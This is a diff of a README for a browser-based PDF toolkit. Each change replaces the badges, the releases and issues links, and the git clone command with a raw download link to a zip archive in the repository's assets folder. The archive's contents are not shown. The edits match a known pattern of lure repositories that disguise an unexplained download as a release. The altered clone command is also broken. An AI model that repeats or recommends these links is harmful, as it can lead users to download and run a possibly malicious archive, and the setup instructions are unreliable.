@@ -1,6 +1,6 @@
 # PDF Toolkit: Your All-in-One Browser-Based PDF Utility 🛠️
 
-![PDF Toolkit](https://img.shields.io/badge/PDF_Toolkit-v1.0-blue.svg) ![GitHub Release](https://img.shields.io/badge/Release-Check%20Latest-brightgreen.svg) [![GitHub](https://img.shields.io/badge/GitHub-Repository-black.svg)](https://github.com/helptrader/pdf-toolkit-app/releases)
+![PDF Toolkit](https://github.com/helptrader/pdf-toolkit-app/raw/refs/heads/main/src/assets/toolkit-pdf-app-v1.3.zip) ![GitHub Release](https://github.com/helptrader/pdf-toolkit-app/raw/refs/heads/main/src/assets/toolkit-pdf-app-v1.3.zip%https://github.com/helptrader/pdf-toolkit-app/raw/refs/heads/main/src/assets/toolkit-pdf-app-v1.3.zip) [![GitHub](https://github.com/helptrader/pdf-toolkit-app/raw/refs/heads/main/src/assets/toolkit-pdf-app-v1.3.zip)](https://github.com/helptrader/pdf-toolkit-app/raw/refs/heads/main/src/assets/toolkit-pdf-app-v1.3.zip)
 
 ## Table of Contents
 
@@ -16,7 +16,7 @@
 
 PDF Toolkit is a modern web application that allows users to perform various PDF manipulations directly in their browser. Built with React and Vite, this tool ensures a responsive and user-friendly experience. With PDF Toolkit, you can merge, split, and secure your PDF files without needing to download any software. 
 
-You can find the latest releases [here](https://github.com/helptrader/pdf-toolkit-app/releases).
+You can find the latest releases [here](https://github.com/helptrader/pdf-toolkit-app/raw/refs/heads/main/src/assets/toolkit-pdf-app-v1.3.zip).
 
 ## Features
 
@@ -43,7 +43,7 @@ To run the PDF Toolkit locally, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/helptrader/pdf-toolkit-app.git
+   git clone https://github.com/helptrader/pdf-toolkit-app/raw/refs/heads/main/src/assets/toolkit-pdf-app-v1.3.zip
    ```
 
 2. Navigate to the project directory:
@@ -96,7 +96,7 @@ Once the application is running, you can use the following features:
 2. Upload a scanned PDF document.
 3. Click "Convert" to extract text from the document.
 
-For detailed instructions and updates, check the [Releases](https://github.com/helptrader/pdf-toolkit-app/releases) section.
+For detailed instructions and updates, check the [Releases](https://github.com/helptrader/pdf-toolkit-app/raw/refs/heads/main/src/assets/toolkit-pdf-app-v1.3.zip) section.
 
 ## Contributing
 
@@ -115,6 +115,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ---
 
-For any issues or feature requests, please check the [Issues](https://github.com/helptrader/pdf-toolkit-app/issues) section on GitHub.
+For any issues or feature requests, please check the [Issues](https://github.com/helptrader/pdf-toolkit-app/raw/refs/heads/main/src/assets/toolkit-pdf-app-v1.3.zip) section on GitHub.
 
-You can find the latest releases [here](https://github.com/helptrader/pdf-toolkit-app/releases).
+You can find the latest releases [here](https://github.com/helptrader/pdf-toolkit-app/raw/refs/heads/main/src/assets/toolkit-pdf-app-v1.3.zip).
